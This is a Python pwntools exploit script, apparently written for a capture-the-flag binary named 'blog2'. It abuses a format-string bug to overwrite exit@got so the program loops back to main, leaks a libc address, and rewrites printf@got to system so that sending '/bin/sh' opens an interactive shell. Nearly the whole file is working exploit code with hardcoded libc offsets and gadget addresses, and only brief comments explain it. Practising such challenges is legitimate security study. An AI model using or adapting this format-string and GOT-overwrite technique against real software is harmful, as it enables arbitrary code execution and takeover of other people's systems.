# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

context(log_level='debug')
fileName = './blog2'
p = process(fileName)
elf = ELF(fileName)

# bin
bin_func_main = elf.sym['main'] + 35    # ret 2 [call init()]
bin_pop_rdi_ret = 0x401383    # ROPgadget --binary blog2 | grep "pop rdi"
bin_exit_got = elf.got['exit']
bin_printf_got = elf.got['printf']

# libc
libc_read_14 = 0xfa340 + 14
libc_system = 0x4a490
libc_str_bin_sh = 0x1b3115

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))
        
def fmtChangeByte(byte, position):
    result = "%{}c%{}$hhn%{}c".format(int(byte, 16), position, 256 - int(byte, 16))
    a = len(result) # 由于长度不定，扩展成 3 行来保证每一次都成功写入
    result = "%{}c%{}$hhn%{}c".format(int(byte, 16) - (24 - a), position, 256 - int(byte, 16)).rjust(24, 'a')
    return result.encode('utf8')

# gdbscript = '''
# b *main+122
# c
# '''
# gdb.attach(p, gdbscript=gdbscript)

# rewrite exit@got to main+35
logger('rewrite exit@got to main+35')
# 0x404048 -> a5
# 0x404049 -> 12
payload = fmtChangeByte('a5', 12) + fmtChangeByte('12', 13) + p64(bin_exit_got) + p64(bin_exit_got + 1)
p.sendlineafter('input sth: \n', payload)

# leak_libc
logger('leak_libc')
payload = b'aaab%3$p'
p.sendlineafter(b'input sth: \n', payload)
p.recvuntil(b'b')

leak_read_got_14 = int(p.recv(14), 16)
libc_base = leak_read_got_14 - libc_read_14
libc_system = libc_base + libc_system
libc_str_bin_sh = libc_base + libc_str_bin_sh

logger('libc_base', hex(libc_base), 'success')
logger('leak_read_got_14', hex(leak_read_got_14), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')

# rewrite printf@got to libc_system
logger('rewrite printf@got to libc_system')
libc_system = hex(libc_system)
libc_system_0 = libc_system[-2:]
libc_system_1 = libc_system[-4:-2]
libc_system_2 = libc_system[-6:-4]

payload = fmtChangeByte(libc_system_0, 17) + fmtChangeByte(libc_system_1, 18) + fmtChangeByte(libc_system_2, 19) + \
    p64(bin_printf_got) + p64(bin_printf_got + 1) + p64(bin_printf_got + 2)
p.sendlineafter(b'input sth: \n', payload)

# getshell
logger('getshell')
p.sendlineafter(b'input sth: \n', p64(libc_str_bin_sh))
p.interactive()